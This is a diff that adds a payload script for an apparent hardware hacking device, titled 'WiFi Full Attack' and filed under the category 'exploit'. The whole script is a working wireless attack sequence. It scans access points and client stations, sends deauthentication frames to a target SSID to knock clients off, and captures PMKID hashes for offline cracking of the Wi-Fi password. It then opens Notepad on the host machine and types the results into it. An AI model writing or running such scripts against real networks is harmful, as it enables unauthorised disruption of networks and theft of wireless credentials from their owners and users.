@@ -1,0 +1,38 @@
+NAME WiFi Full Attack
+DESCRIPTION Scan APs, deauth, PMKID capture, type results, save
+CATEGORY exploit
+PLATFORMS WIN,MAC,LINUX
+OPTION TARGET_SSID TargetNetwork "SSID to attack"
+PLATFORM ALL
+IF_CONNECTED
+  PRINT Phase 1: Scanning APs...
+  LED_COLOR BLUE
+  WIFI_SCAN
+  WIFI_WAIT 5000
+  PRINT Phase 2: Station scan...
+  LED_COLOR CYAN
+  WIFI_SCAN_STA
+  WIFI_WAIT 5000
+  PRINT Phase 3: Deauth {{TARGET_SSID}}...
+  LED_COLOR RED
+  WIFI_DEAUTH_TARGET {{TARGET_SSID}}
+  WIFI_WAIT 10000
+  WIFI_STOP
+  PRINT Phase 4: PMKID capture...
+  LED_COLOR MAGENTA
+  WIFI_SNIFF_PMKID
+  WIFI_WAIT 15000
+  WIFI_STOP
+  PRINT Phase 5: Saving results...
+  LED_COLOR YELLOW
+  SAVE_WIFI
+  PRINT Phase 6: Typing results to target...
+  OPEN_NOTEPAD
+  DELAY 2000
+  STRINGLN === WiFi Attack Results ===
+  WIFI_RESULT
+  STRINGLN === Station Results ===
+  WIFI_STA_RESULT
+  LED_COLOR GREEN
+  PRINT Attack complete!
+END_IF
